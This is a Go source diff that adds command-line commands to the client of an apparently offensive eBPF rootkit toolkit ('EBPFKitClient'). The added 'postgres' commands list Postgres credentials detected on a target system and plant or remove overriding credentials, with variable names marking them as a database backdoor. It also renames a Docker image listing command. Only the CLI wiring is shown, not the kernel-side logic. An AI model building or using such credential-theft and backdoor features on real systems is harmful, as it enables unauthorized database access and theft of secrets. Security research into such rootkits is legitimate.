@@ -37,6 +37,10 @@ var cmdDockerProg = &cobra.Command{
 	Use: "docker",
 }
 
+var cmdPostgresProg = &cobra.Command{
+	Use: "postgres",
+}
+
 var cmdAddFSWatch = &cobra.Command{
 	Use:   "add [path of file]",
 	Short: "add a filesystem watch",
@@ -77,9 +81,9 @@ var cmdDelPipeProg = &cobra.Command{
 }
 
 var cmdGetImagesList = &cobra.Command{
-	Use:   "list_images",
+	Use:   "list",
 	Short: "list container images",
-	Long:  "list_images returns the list of Docker images detected",
+	Long:  "list returns the list of Docker images detected",
 	RunE:  getImagesListCmd,
 }
 
@@ -95,6 +99,27 @@ var cmdDelDockerImageOverride = &cobra.Command{
 	Short: "delete removes a Docker image override request",
 	Long:  "delete is used to stop overriding the provided Docker image on the target system",
 	RunE:  delDockerImageOverrideCmd,
+}
+
+var cmdPostgresCredentialsList = &cobra.Command{
+	Use:   "list",
+	Short: "list postgres credentials",
+	Long:  "list returns the list of the Postgres credentials detected on the target system",
+	RunE:  getPostgresCredentialsCmd,
+}
+
+var cmdPutPGBackdoorSecret = &cobra.Command{
+	Use:   "put",
+	Short: "put overrides a set of Postgres credentials",
+	Long:  "put is used to override a set of Postgres credentials on the target system (the provided role needs to exist)",
+	RunE:  putPostgresRoleCmd,
+}
+
+var cmdDelPGBackdoorSecret = &cobra.Command{
+	Use:   "delete",
+	Short: "delete removes a set of Postgres credentials",
+	Long:  "delete is used to remove a set of Postgres credentials from the target system",
+	RunE:  delPostgresRoleCmd,
 }
 
 var options CLIOptions
@@ -190,5 +215,32 @@ func init() {
 	cmdDockerProg.AddCommand(cmdPutDockerImageOverride)
 	cmdDockerProg.AddCommand(cmdDelDockerImageOverride)
 	EBPFKitClient.AddCommand(cmdDockerProg)
+
+	cmdPostgresCredentialsList.PersistentFlags().StringVarP(
+		&options.Output,
+		"output",
+		"o",
+		"",
+		"output file to write into")
+	cmdPutPGBackdoorSecret.PersistentFlags().StringVar(
+		&options.Secret,
+		"secret",
+		"",
+		"defines the Postgres secret to send")
+	cmdPutPGBackdoorSecret.PersistentFlags().StringVar(
+		&options.Role,
+		"role",
+		"",
+		"defines the Postgres role to send")
+	cmdDelPGBackdoorSecret.PersistentFlags().StringVar(
+		&options.Role,
+		"role",
+		"",
+		"defines the Postgres role to delete")
+
+	cmdPostgresProg.AddCommand(cmdPostgresCredentialsList)
+	cmdPostgresProg.AddCommand(cmdPutPGBackdoorSecret)
+	cmdPostgresProg.AddCommand(cmdDelPGBackdoorSecret)
+	EBPFKitClient.AddCommand(cmdPostgresProg)
 
 }
